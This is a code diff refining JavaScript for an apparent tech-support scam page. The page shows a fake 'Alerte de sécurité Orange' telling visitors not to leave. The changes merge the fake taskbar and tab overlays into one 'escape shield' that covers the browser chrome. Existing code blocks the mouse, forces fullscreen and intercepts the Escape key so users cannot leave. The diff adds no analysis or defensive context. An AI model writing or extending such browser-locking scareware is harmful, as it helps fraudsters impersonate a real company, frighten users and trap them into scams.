@@ -13,11 +13,13 @@
 
   mount.innerHTML =
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
-    '<div id="securityTaskbarModal" class="security-taskbar-modal" aria-hidden="true" role="alert">' +
-    '<p class="security-taskbar-alert">Alerte de sécurité Orange</p>' +
-    '<p class="security-taskbar-warning">Ne quittez pas la page</p>' +
-    '</div>' +
-    '<div id="securityTabsBlocker" class="security-tabs-blocker" aria-hidden="true"></div>' +
+    '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
+    '<div class="escape-shield-tabs"></div>' +
+    '<div class="escape-shield-taskbar-wrap">' +
+    '<div class="escape-shield-taskbar-modal">' +
+    '<p class="escape-shield-alert">Alerte de sécurité Orange</p>' +
+    '<p class="escape-shield-warning">Ne quittez pas la page</p>' +
+    '</div></div></div>' +
     '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
     '<div class="security-page">' +
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
@@ -179,35 +181,22 @@
     securityOverlay.classList.add("is-active");
     securityOverlay.setAttribute("aria-hidden", "false");
     document.body.classList.add("security-mode");
-    showSecurityTaskbarModal();
   }
 
-  function showSecurityTaskbarModal() {
-    var taskbarModal = document.getElementById("securityTaskbarModal");
-    var tabsBlocker = document.getElementById("securityTabsBlocker");
-    if (taskbarModal) {
-      document.body.appendChild(taskbarModal);
-      taskbarModal.classList.add("is-visible");
-      taskbarModal.setAttribute("aria-hidden", "false");
-    }
-    if (tabsBlocker) {
-      document.body.appendChild(tabsBlocker);
-      tabsBlocker.classList.add("is-visible");
-      tabsBlocker.setAttribute("aria-hidden", "false");
-    }
+  function showEscapeShield() {
+    var shield = document.getElementById("escapeShield");
+    if (!shield) return;
+    document.body.appendChild(shield);
+    shield.classList.add("is-visible");
+    shield.setAttribute("aria-hidden", "false");
+    document.body.style.visibility = "visible";
   }
 
-  function hideSecurityTaskbarModal() {
-    var taskbarModal = document.getElementById("securityTaskbarModal");
-    var tabsBlocker = document.getElementById("securityTabsBlocker");
-    if (taskbarModal) {
-      taskbarModal.classList.remove("is-visible");
-      taskbarModal.setAttribute("aria-hidden", "true");
-    }
-    if (tabsBlocker) {
-      tabsBlocker.classList.remove("is-visible");
-      tabsBlocker.setAttribute("aria-hidden", "true");
-    }
+  function hideEscapeShield() {
+    var shield = document.getElementById("escapeShield");
+    if (!shield) return;
+    shield.classList.remove("is-visible");
+    shield.setAttribute("aria-hidden", "true");
   }
 
   function forceStayFullscreen() {
@@ -248,8 +237,8 @@
     document.body.classList.remove("security-dezoomed");
     document.body.classList.add("security-dezoomed");
 
+    showEscapeShield();
     showEscapeExitModal();
-    showSecurityTaskbarModal();
 
     if (document.fullscreenElement && document.exitFullscreen) {
       document.exitFullscreen().catch(function () {});
@@ -340,11 +329,14 @@
           escapeKeyHeld = true;
           startEscapeHoldTimer();
         }
+        showEscapeShield();
         forceStayFullscreen();
         return;
       }
 
       if (event.type === "keyup") {
+        if (isDezoomed) return;
+
         var heldLongEnough =
           escapeHoldStart !== null &&
           Date.now() - escapeHoldStart >= ESCAPE_DEZOOM_MS;
@@ -356,6 +348,8 @@
           exitAfterEscapeHold();
           return;
         }
+
+        hideEscapeShield();
 
         if (!heldLongEnough && !isDezoomed) {
           forceStayFullscreen();
